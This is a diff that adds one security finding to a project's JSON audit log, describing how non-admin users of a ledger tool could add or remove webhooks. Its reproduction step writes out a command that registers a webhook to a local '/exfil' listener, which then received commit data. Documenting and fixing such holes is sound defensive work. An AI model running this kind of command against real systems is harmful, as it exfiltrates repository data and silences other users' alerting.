@@ -1957,6 +1957,17 @@
       "status": "fixed",
       "severity": "security",
       "commit": "7a56aab"
+    },
+    {
+      "id": "FG-038",
+      "where": "crates/axon-ledger/src/main.rs",
+      "claimed": "`requires_admin` is EXHAUSTIVE over the command enum with no `_` arm, so a new command does not compile until someone decides whether it is privileged.",
+      "reality": "Exhaustiveness guarantees a decision is MADE for every command; it cannot catch one decided WRONGLY. `Commands::Webhook` sat in the group commented 'appends NEW records; does not rewrite or reattribute' \u2014 but `webhook add`/`rm` append nothing. They write webhooks.json, durable egress configuration that later drives an outbound POST from the ledger host when `pre-deploy` fires.",
+      "reproduced": "RBAC armed (admins=[alice], authenticated_admins=[nobody-real]), caller not an admin: `webhook add --event unexplained-deploy --provider generic --url http://127.0.0.1:9977/exfil` -> exit 0, webhooks.json written; `pre-deploy` then POSTed commit authors, messages and SHAs to that listener; `webhook rm wh_00000001` removed a legitimate admin's hook. Exfiltration, arbitrary-URL SSRF from the ledger host, and silencing another principal's alerting \u2014 none of it requiring the dev escape.",
+      "fix": "`webhook add`/`rm` classified privileged, `webhook list` left open as a read (same reasoning as `rbac list`). Regression test names both directions plus the admin control; the destructive-verb sweep gained webhook rows. Mutation-tested by reclassifying it back to non-privileged. Found by an adversarial review AFTER the exhaustive-match change had been described as making a missed classification impossible \u2014 the correction to that claim is recorded in the code comment at the arm.",
+      "status": "fixed",
+      "severity": "security",
+      "commit": "30fbfaa"
     }
   ]
 }
